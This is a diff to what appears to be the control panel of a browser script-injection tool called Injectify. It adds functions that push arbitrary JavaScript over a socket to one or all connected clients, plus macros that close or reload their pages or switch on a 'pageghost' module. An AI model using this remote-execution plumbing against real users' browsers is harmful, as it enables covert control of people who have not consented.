@@ -1,3 +1,4 @@
+import _ from 'lodash'
 import NProgress from 'nprogress'
 
 export function toggleDrawer (open, onlyOnMobile) {
@@ -166,6 +167,95 @@ export function log (log) {
   }
 }
 
-// export function execute() {
+export function clearConsole () {
+  return {
+    type: 'CONSOLE_CLEAR'
+  }
+}
 
-// }
+export function execute(script, token, id) {
+  const { socket } = window
+  return (dispatch, getState) => {
+    const state = getState().injectify
+    const project = state.projects[state.selectedProject.index]
+
+    let req = {
+      project: project.name,
+      script
+    }
+
+    if (typeof token === 'undefined' || token === 'selected') {
+      let selectedToken = project.console.state.selected
+      if (selectedToken) {
+        req.token = project.console.state.selected
+      } else {
+        console.error('No client selected')
+      }
+    } else if (token === '*') {
+      req.recursive = true
+    } else {
+      req.token = token
+    }
+
+    if (typeof id !== 'undefined' && id !== '*') {
+      req.id = id
+    }
+
+    socket.emit('inject:execute', req)
+  }
+}
+
+export function executeMacro(id, macro) {
+  const { socket, store } = window
+  const state = store.getState().injectify
+  const project = state.projects[state.selectedProject.index]
+  const client = project.console.state.clients[project.console.state.selected]
+
+  if (client) {
+    const session = _.find(client.sessions, { id })
+    let req = {
+      project: project.name,
+      token: project.console.state.selected,
+      id,
+    }
+    if (session) {
+      req.script = (() => {switch (macro) {
+        case 'execute': {
+          //
+          return null
+        }
+        case 'close': {
+          return 'window.close()'
+        }
+        case 'open': {
+          return null
+        }
+        case 'reload': {
+          return 'location.reload()'
+        }
+        case 'pageghost': {
+          /**
+           * Delisten any other sessions
+           */
+          socket.emit('inject:execute', {
+            project: req.project,
+            token: req.token,
+            script: `if (injectify.info.id !== ${JSON.stringify(req.id)}) injectify.module('pageghost', false)`
+          })
+          return `injectify.module('pageghost', true)`
+        }
+        default: {
+          return macro
+        }
+      }})()
+
+      if (req.script === null) return
+
+      socket.emit('inject:execute', req)
+    } else {
+      console.error(`Couldn't find session ${id}`, client, session)
+    }
+  } else {
+    console.error(`Couldn't find client!`, client)
+  }
+}
